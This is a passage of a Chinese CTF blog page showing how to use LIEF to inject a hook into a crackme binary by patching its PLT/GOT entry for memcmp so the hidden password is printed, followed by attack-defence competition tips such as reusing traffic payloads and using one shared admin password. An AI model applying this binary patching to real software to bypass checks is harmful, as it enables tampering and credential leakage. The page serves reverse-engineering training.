class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">libm.write(<span class="string">"libm.so.6"</span>)</span><br></pre></td></tr></table></figure>
<p>通过地址进行钩子</p>
<p>libm.patch_address </p>
<p>通过 got/plt 表 直接劫持程序</p>
<p>测试程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Damn_YoU_Got_The_Flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> password[] = <span class="string">"\x18\x3d\x31\x32\x03\x05\x33\x09\x03\x1b\x33\x28\x03\x08\x34\x39\x03\x1a\x30\x3d\x3b"</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span>* input)</span></span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span>* input)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(password) - <span class="number">1</span>; ++i) &#123;</span><br><span class="line"></span><br><span class="line">    password[i] ^= <span class="number">0x5c</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(password, input, <span class="keyword">sizeof</span>(password) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (check(argv[<span class="number">1</span>]) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You got it !!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wrong"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hook.c 内容，hook <span class="built_in">memcpy</span>, 打印内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"arch/x86_64/syscall.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdout 1</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_memcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* lhs, <span class="keyword">const</span> <span class="keyword">void</span>* rhs, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> msg[] = <span class="string">"Hook add\n"</span>;</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)lhs, n);</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, <span class="string">"\n"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, (<span class="keyword">const</span> <span class="keyword">char</span>*)rhs, n);</span><br><span class="line"></span><br><span class="line">  _write(<span class="built_in">stdout</span>, <span class="string">"\n"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hook 脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">crackme = lief.parse(<span class="string">"crackme.bin"</span>)</span><br><span class="line"></span><br><span class="line">hook = lief.parse(<span class="string">"hook"</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">segment_added = crackme.add(hook.segments[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">my_memcmp = hook.get_symbol(<span class="string">"my_memcmp"</span>)</span><br><span class="line"></span><br><span class="line">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">crackme.patch_pltgot(<span class="string">'memcmp'</span>, my_memcmp_addr)</span><br><span class="line"></span><br><span class="line">crackme.write(<span class="string">"crackme.hooked"</span>)</span><br></pre></td></tr></table></figure>
<h1 id="线下攻防经验小结"><a href="#线下攻防经验小结" class="headerlink" title="线下攻防经验小结"></a>线下攻防经验小结</h1><pre><code>首先正常比赛会提供提交 flag 的接口，
接口地址类似 http://172.16.4.1/Common/submitAnswer。一般我们需要根据主办方给出的文档要求通过接口提交 flag。在比赛中要求接口地址使用 Post 方式提交，
提交时带两个参数，一个是 Answer，
其值为获取到的 flag 字符串，而另一个则是 token
 ，其值为各个队伍的队伍 Token。
然后比赛时主办方也会给每个参赛队伍提供一台用于分析网络流量的虚拟机 ，选手需要访问地址下载流量文件进行分析。
</code></pre><h2 id="关注-Gamebox-状态"><a href="#关注-Gamebox-状态" class="headerlink" title="关注 Gamebox 状态"></a>关注 Gamebox 状态</h2><pre><code>比赛中可以查看己方和敌方 GameBox 状态。
时刻关注可以尽早获取比赛信息，根据信息做出调整。
对于己方 GameBox，有存在如下原因造成 GameBox 被 down 掉：
程序 patch 失误导致服务不可用。
在程序 patch 完之后要进入下一轮关注 GameBox 状态，
如果 patch 失误导致不可用，需要及时挽救。
对手不正当攻击导致 GameBox 不可用。如果发现，需要及时补救。
主办方加强程序 check。这种情况主办方会对所有队员进行通知公告。在 GameBox 状态墙上的状态会显示该题的各队 GameBox 大面积不可用。
</code></pre><h2 id="敌人gamebox"><a href="#敌人gamebox" class="headerlink" title="敌人gamebox"></a>敌人gamebox</h2><pre><code>对于敌方 GameBox。我们可以获取以下信息。
根据攻击流观测哪些队伍的 GameBox 没有防御成功。
针对这些队伍可以更多地实现攻击
有队伍拿出一血时。可以根据各队 GameBox     状态推断出一血队伍是否已经写出利用脚本。
写出利用脚本后可以观测己方是否做好了防御。
分清区段与端口
比赛过程中会主办方会安排好合理的网段分布。
</code></pre><h2 id="比赛的一些策略"><a href="#比赛的一些策略" class="headerlink" title="比赛的一些策略"></a>比赛的一些策略</h2><pre><code>在比赛过程中，不宜死耗在一道题上，
由于一血的优势性，在比赛过程中更应该全面了解赛题难度，
先从 简单题 开始进行分析，步步为营。
比赛过程中，两极会严重分化。
应该着力打击和自己实力相当和比自己队伍更强的队伍，
尤其是分数相差无几的情况下，更要严防严守。
比赛中 NPC 会不定时发出攻击流量。从攻击流量中可以得到 payload。
一定要把 NPC 往死里打。
在开赛初可以将所有的管理密码都设置为同一个密码，
这样方便队员登录管理。在初期将所有文件备份下来供队内分享。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>






<nav id="pagination">
  
  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  

  
<div class="widget tag">
  <h3 class="title">Recent Posts</h3>
  <ul class="entry">
    
      <li>
        <a href="/2018/08/20/hfo/"></a>
      </li>
    
      <li>
        <a href="/2018/07/07/rtd/">return to dl-resolve</a>
      </li>
    
      <li>
        <a href="/2018/07/07/bpf/">bpf</a>
      </li>
    
      <li>
        <a href="/2018/07/07/brop/">brop</a>
      </li>
    
      <li>
        <a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a>
      </li>
    
  </ul>
</div>


  

  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2018 another
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>